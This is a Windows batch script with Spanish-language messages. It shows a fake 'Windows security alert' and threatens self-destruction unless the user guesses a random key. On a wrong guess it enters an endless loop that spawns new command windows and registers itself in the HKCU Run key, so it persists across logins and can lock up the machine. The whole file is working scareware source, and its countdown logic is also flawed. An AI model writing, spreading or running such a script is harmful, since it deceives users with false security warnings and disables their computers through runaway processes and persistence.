@echo off
setlocal enabledelayedexpansion
title CRITICAL SYSTEM RECOVERY
color 0c
cls

:: [RULETA RUSA]
set /a "master_key=%random% %% 9 + 1"

echo ======================================================
echo           ALERTA DE SEGURIDAD DE WINDOWS
echo ======================================================
echo.
echo Se ha detectado una amenaza. Introduce la LLAVE (1-9).
echo TIENES 30 SEGUNDOS O EL SISTEMA SE AUTODESTRUIRA.
echo.

:: [CONTADOR DE 30 SEGUNDOS]
:: Usamos un bucle para mostrar el tiempo real
for /L %%i in (30,-1,1) do (
    cls
    echo ======================================================
    echo           ALERTA DE SEGURIDAD DE WINDOWS
    echo ======================================================
    echo.
    echo ELIGE LA LLAVE CORRECTA (1-9)
    echo TIEMPO RESTANTE: %%i SEGUNDOS...
    echo.
    :: El comando choice permite esperar 1 segundo por cada ciclo
    choice /c 123456789 /t 1 /d 1 /n /m "Introduce la llave: " >nul
    
    :: Si el usuario pulsa algo, salimos del bucle del contador
    if !errorlevel! neq 0 (
        set "user_input=!errorlevel!"
        goto :CHECK_KEY
    )
)

:: Si llega aquí es que se acabó el tiempo
echo.
echo [-] TIEMPO AGOTADO.
goto :V10_PAYLOAD

:CHECK_KEY
if "%user_input%"=="%master_key%" (
    echo.
    echo [+] Acceso concedido. Sistema a salvo.
    timeout /t 5 >nul
    exit
) else (
    echo.
    echo [-] LLAVE %user_input% INCORRECTA. ERA LA %master_key%.
    timeout /t 2 >nul
)

:V10_PAYLOAD
:: [EL CAOS DEL V10 ORIGINAL]
:LOOP
start cmd /c "color 0a & tree c:\ /f"
start cmd /c "color 0c & echo ERROR_%random% & pause"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemWatch" /t REG_SZ /d "%~f0" /f
goto :LOOP
